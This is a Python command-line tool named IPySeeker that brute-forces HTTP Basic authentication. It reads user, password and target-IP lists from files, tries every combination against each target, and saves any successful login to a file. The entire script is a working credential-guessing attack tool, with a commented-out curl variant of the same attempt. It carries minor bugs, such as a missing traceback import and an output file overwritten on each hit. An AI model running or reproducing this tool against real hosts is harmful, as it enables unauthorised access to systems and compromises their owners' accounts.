#!/usr/bin/env python3
####################################################################################
# Brute-forcing CLI tool, which takes lists from given files.
# It must be given at least a list of user, a list of passwords and a list of targets (IPs)
####################################################################################
__AUTHOR__ = 'Galford'
__VERSION__ = "0.0.1 April 2020"

# Import required functions and libraries
import os, sys, csv, requests, re



print(r"""
  _____ _____        _____           _             
 |_   _|  __ \      / ____|         | |            
   | | | |__) |   _| (___   ___  ___| | _____ _ __ 
   | | |  ___/ | | |\___ \ / _ \/ _ \ |/ / _ \ '__|
  _| |_| |   | |_| |____) |  __/  __/   <  __/ |   
 |_____|_|    \__, |_____/ \___|\___|_|\_\___|_|   
               __/ |                               
              |___/                                

By Galford
""")

# Main menu
def main():
	MenuString = r"""
[1] Choose input lists and start
[2] Exit
	"""
	# Displays CLI menu options
	print(MenuString)
	MenuInput = input("[*] Please type the number of the action you want to perform: ")
	if MenuInput == "1":
		userstring = input("[*] Type the file containing the user list you want to use: ")
		userresults = fileChecker(userstring)
		passstring = input("[*] Type the file containing the password list you want to use: ")
		passresults = fileChecker(passstring)
		targetstring = input("[*] Type the file containing the target list you want to use: ")
		targetresults = fileChecker(targetstring)
		#os.system("touch results.txt")
		probeTargets(userresults, passresults, targetresults)
	elif MenuInput == "2":
		print("[!] Shutting IPySeeker down")
		sys.exit()
	else:
		print("[!] Invalid input. Please choose from the aforementioned list")

# Opens file and retrieves data
def fileChecker(filepath):
	filedata = []
	try:
		with open(filepath, 'r') as file:
			filedata = file.readlines()
	except Exception as e:
		print("[!] Error reading file.")
		traceback.print_exc()
		sys.exit()
	finally:
		print("[+] Detected %i lines." %(len(filedata)))
		return filedata

# Test user/password combinations on targets
def probeTargets(users, passwords, targets):
	for i in range(len(users)):
		pass
		for j in range(len(passwords)):
			pass
			for k in range(len(targets)):
				currentuser = users[i].strip()
				currentpass = passwords[j].strip()
				currenttarget = targets[k].strip()
				currenttarget = currenttarget.replace(",",":")
				url = "http://"+currenttarget

				try:
					print("[*] Login attempt as User: \"%s\" with Pass: \"%s\" on Target: \"%s\" " %(currentuser, currentpass, currenttarget))
					status = requests.get(url, auth=(currentuser,currentpass), timeout=5)
					status = re.sub("\D", "", str(status))
					print (status)
					if status == "200":
						print ("[+] Login successful. Saving result.")
						with open("Output.txt", "w") as text_file:
							print(url+","+currentuser+","+currentpass, file=text_file)
					else:
						print("[!] Login failed with status code: %s" %(status))
				except requests.Timeout:
					print ("[!] Request time out")
					pass
				except requests.ConnectionError:
					print ("[!] Connection error")
					pass

				#commandstring = "curl -m 10 -s -u %s:%s -n %s 2>/dev/null >> results.txt" %(currentuser, currentpass, currenttarget)
				#print("[*] Login attempt as User: \"%s\" with Pass: \"%s\" on Target: \"%s\" " %(currentuser, currentpass, currenttarget))
				#os.system(commandstring)
				#status = requests.get(currenttarget)
				#status = status.status_code
			
		
	

# Initializes main routine
if __name__ == '__main__':
    main()